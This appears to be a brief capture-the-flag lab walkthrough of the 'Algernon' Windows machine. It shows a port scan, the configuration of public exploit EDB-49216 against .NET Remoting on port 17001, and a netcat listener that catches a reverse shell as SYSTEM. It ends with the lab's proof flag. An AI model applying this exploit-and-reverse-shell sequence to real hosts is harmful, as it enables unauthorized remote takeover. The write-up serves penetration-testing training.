###### tags: `Offsec` `PG Practice` `Easy` `Windows`

# Algernon
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.204.65 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.204.65:21
Open 192.168.204.65:80
Open 192.168.204.65:135
Open 192.168.204.65:139
Open 192.168.204.65:5040
Open 192.168.204.65:7680
Open 192.168.204.65:445
Open 192.168.204.65:9998
Open 192.168.204.65:17001
Open 192.168.204.65:49664
Open 192.168.204.65:49665
Open 192.168.204.65:49666
Open 192.168.204.65:49667
Open 192.168.204.65:49668
Open 192.168.204.65:49669

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 03-19-24  06:59PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
9998/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
17001/tcp open  remoting      syn-ack MS .NET Remoting services
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

google找到[edb-49216](https://www.exploit-db.com/exploits/49216)，更改內容
```
HOST='192.168.204.65'
PORT=17001
LHOST='192.168.45.242'
LPORT=9001
```

打開nc，執行.py等反彈得到Administrator的權限，在`C:\Users\Administrator\Desktop`得到proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49216.py

PS C:\Windows\system32> whoami
nt authority\system

PS C:\USers\Administrator\Desktop> type proof.txt
3de7ddae00c1e953fa5ad2c4d3d73d72
```